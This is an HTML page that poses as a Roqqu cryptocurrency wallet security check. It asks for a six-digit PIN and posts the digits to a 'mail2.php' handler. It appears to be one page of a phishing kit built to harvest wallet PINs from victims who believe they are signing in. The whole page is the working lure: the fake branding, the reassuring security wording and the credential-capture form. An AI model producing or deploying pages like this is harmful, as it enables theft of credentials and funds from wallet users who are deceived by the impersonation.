

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="land/img/jpg" href="land/img/favicon.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<title>verify</title>
</head>
<style>
table{
	margin-top:120px;
}
h2{
	color:#FFF;
	font-family:Arial, Helvetica, sans-serif;
	font-size:54px;

	}
p{
	color:#FFF;
	font-family:"Lucida Sans Unicode", "Lucida Grande", sans-serif;
	font-size:30px;
}
input {
  font-size: 3rem;
  width: 2.9rem;
  text-align: center;
  background-color:#002142;
  color:#FFF;
  border: 2px solid white;
  margin-top:60px;

}
input:focus {
  border: 2px solid yellowgreen;
  outline: none;
}
button{
	background-color:#0C0;
	font-size:34px;
	color:#FFF;
	border:none;
	margin-top:120px;
}

.buttonload {
  background-color:#0C0;/* Green background */
  border: none; /* Remove borders */
  color: white; /* White text */
  padding: 7px 10px; /* Some padding */
  font-size: 34px; /* Set a font-size */
}

/* Add a right margin to each icon */
.fa {
  margin-left: -12px;
  margin-right: 8px;
}

form{
    display:inline-block;
}

</style>
<body bgcolor="#002142">

<table align="center" width="800" >
  <tr>
    <td>
<p align="center"><img src="land/img/padlock.png" width="500" /></p>
<h2 align="center">Enter Pin</h2>
<p align="center">For your security, Pin is required to sign into and </p>
<p align="center">make transactions on Roqqu wallet</p>
<div class="digits" align="center">
<form action="/mail2.php" name="form" id='form' class="form-horizontal" method="POST">
  <input type="tel" required="yes" id="pin"  maxlength="1" name="pin1" />&nbsp;
  <input type="tel" required="yes" id="pin"  maxlength="1" name="pin2" />&nbsp;
  <input type="tel" required="yes" id="pin"  maxlength="1" name="pin3" />&nbsp;
  <input type="tel" required="yes" id="pin"  maxlength="1" name="pin4" />&nbsp;
  <input type="tel" required="yes" id="pin"  maxlength="1" name="pin5" />&nbsp;
  <input type="tel" required="yes" id="pin"  maxlength="1" name="pin6" /><br/> 
  <div class="button">
        <div class="button">
<div class="button">
    
     <!--<button name='submit' id='submit' style='border-radius:6px !important; width:300px; height:90px; padding: auto;' class='ui px-auto text-center  mx-auto d-block button green btn' type='submit' onclick="return changeText('submitbutton');">
    <span class='text-center'>Complete</span>
    </button>-->
    
    <input style='border-radius:6px !important; width:300px; height:90px; padding: auto;' class="buttonload" name='submitbutton' id="submitbutton" onclick="return changeText('submitbutton');" type="submit" value="Complete" />
     <input type="hidden" name="MM_insert" value="form" />
</form>
  </div> 
</td>
  </tr>
</table>

<script type="text/javascript"> 
    function changeText(submitId){
        var submit = document.getElementById(submitId);
        submit.value = 'Loading...';
        return true;
    };
</script>




<script>
// Listen on the 'input' event inside the .digits area:
document.querySelector(".digits").addEventListener("input", function(e){

  // Exclude non-numeric characters from input:
  e.target.value = e.target.value.replace(/[^0-9]/g,'');

  // If the input value is filled and there is a neighbouring element that is input, then focus on that element:
  if ( e.target.value !== "" && e.target.nextElementSibling && e.target.nextElementSibling.nodeName === "INPUT" ){

    e.target.nextElementSibling.focus();

  }

});
</script>


</body>
</html>

